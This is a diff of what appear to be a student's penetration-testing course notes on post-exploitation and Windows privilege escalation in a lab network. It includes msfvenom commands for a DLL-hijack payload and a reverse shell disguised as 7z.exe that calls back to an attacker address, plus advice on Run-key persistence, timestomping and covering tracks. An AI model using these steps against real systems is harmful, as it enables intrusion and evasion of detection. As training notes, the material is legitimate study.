@@ -457,7 +457,7 @@ turn off anti virus (realtime protection)
 
 change to quad 0's for host and local port to the desired machine after you make a tunnel to the target from the jumpbox 
 
-POST EXPLOITATION
+DAY 5 ###POST EXPLOITATION###
 SSH Info
 - Can run commands from home terminal without fully logging on
 EX: ssh student@<IP> ls -lisa
@@ -515,6 +515,106 @@ Try pinging to machine if scp doesn't work
 192.168.150.253 Donovian-Intranet
 proxychains nc 192.168.150.253 3201
 192.168.150.253 port 514 (syslog is open)
+
+DAY 6 ### PRIVILIGE ESCALATION ###
+Windows
+Privilige escalation is user, integrity-level elevation is programs with certain privileges
+
+Windows Access Control Model
+- Access Tokens 
+   o Security IDentifier (SID) associations and Token associations
+- Security Descriptors
+   o DACL
+   o SACL
+   o ACEs
+
+DLL Search Order
+Executables check the following locations (in successive order):
+- HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+- The directory the the Application was run from
+-  The directory specified in in the C+ function GetSystemDirectory()
+- The directory specified in the C+ function GetWindowsDirectory()
+- The current directory
+
+Windows Integrity Level
+Untrusted = Anonymous SID access tokens
+Low = Everyone SID access token (world)
+Medium = Autheniated Users
+High = Administrators
+System = System services (LocalSystem, LocalService, NetworkService)
+
+sysinternals
+PS C:> sigcheck -m <absolute filepath>
+PS C:> sigcheck <absolute filepath> gives File information 
+icacls "<Directory Location>" shows running permissions 
+User Account Control (UAC)
+Gives the ability to run commands as admin (sudo)
+- Always Notify
+- Only when making changes 
+- Nerver Notify
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+Scheduled Task and Services
+Items to evaluate include:
+- Write Permissions ( able to write and save changes )
+- Non-Standard Locations 
+- Unquoted Executable Paths ( you can put an executable in the path is NOT quoted )
+- Vulnerabilites in Executables ( if Risk exsist it is vulnerable )
+- Permission to Run As SYSTEM
+
+schtasks /query /fo LIST /v | select-string -Pattern "Task to Run" -CaseSensitive | select-String -pattern "COM handler" -NotMatch
+
+Create a .DLL in Metasploit with a desired shell code and send it into the desired directory for the privilige escalation
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f dll > SSPICLI.dll
+scp student@10.50.X.X:/home/student/SSPICLI.dll C:\users\DemoAdmin
+
+Filter by Description to see if there are any missing "pieces" to the tasks EX: a service with no description and with an automatic start time
+- you can also use the GUI to see if you have priviliges in a certain directory with right clicking
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.50.21.212 LPORT=12345 -f exe > 7z.exe
+send payload to the windows machine 
+setup nc on the linux and you should have your windows on your linux machine
+
+Setting up Persistance 
+Survives:
+- Reboots
+- Credential changes 
+- DHCP IP reassignment
+- etc
+Considerations:
+- File naming
+- File location
+- Timestomping
+- Port selection
+- name conventions
+
+persistance Keys
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
+- Run( everytime a machine or user starts up )
+- RunOnce( only runs once after a machine/user is booted up )
+
+Covering Tracks 
+- Where will logs be set if I run a command 
+- Hide File locations, names, times 
+- Know the naming conventions and try to replicate how the target sets up thier stuff
+- Artifacts 
+   o Event Logs ( Applications, Security, Setup, System )
+
+Important Microsoft Event IDs
+4624/4625       Successful/failed login
+4720            Account created
+4672            Administrative user logged on
+7045            Service created
+
+
+
+
+
+
+
+
 
 
 
